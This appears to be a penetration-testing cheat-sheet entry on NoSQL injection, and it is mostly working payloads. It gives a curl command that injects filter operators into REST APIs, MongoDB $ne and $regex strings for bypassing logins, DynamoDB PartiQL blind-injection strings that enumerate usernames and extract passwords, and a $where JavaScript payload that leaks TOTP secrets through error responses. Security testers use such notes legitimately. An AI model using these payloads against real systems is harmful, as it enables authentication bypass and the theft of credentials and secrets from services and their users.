# NoSQL Injection

ORM/REST bracket-syntax filter operator injection — some REST layers (Strapi/MongoDB-backed APIs especially) let a query-string filter key carry an operator directly, so a public "list" endpoint meant to show only `is_public=true` items can be told to show the opposite:
```bash
curl -G "<target>/api/items/public" --data-urlencode 'filter[is_public][$ne]' -H "Authorization: Bearer <token>"
```
Try `$ne`/`$gt`/`$exists` etc. against any filter param that looks like it maps straight onto a backend query object.

Auth bypass via Mongo operator injection — try this when SQLMap finds nothing on a Node/Mongo stack.

```bash
# JSON body
{"username":{"$ne":null},"password":{"$ne":null}}

# form-encoded (often the one that actually completes the login)
username=<USER>&password[$ne]=asdf

# $regex operator via a PHP-style array param — matches any value, not just a known one
username[$regex]=.*&password[$regex]=.*
```

Blind boolean injection on query-style NoSQL (e.g. DynamoDB PartiQL) when there's no `$ne`-style operator — same binary-search idea as blind SQLi, just with the dialect's own boolean functions:

```bash
asdf' OR username > 'X ORDER BY username LIMIT 1 --                          # enumerate usernames
asdf' OR (username='<user>' AND begins_with(password,'<char>')) OR '1'='2 -- # extract one char at a time
```
sqlmap doesn't support PartiQL — a small custom script driving the same true/false oracle is usually needed.

Error-based blind extraction via `$where` (MongoDB only, where arbitrary JS runs server-side): throw inside the expression to turn a hidden field into an HTTP error you can read, then brute-force it character by character with `$regex`:
```bash
# leak a secret field's value as part of the error response
GET /api/v1/users.list?query={"$where":"this.username==='<user>' && (()=>{ throw this.services.totp.secret })()"}

# then brute-force a known-prefix value blindly
POST /anon-endpoint  {"token":{"$regex":"^<prefix>"}}
```


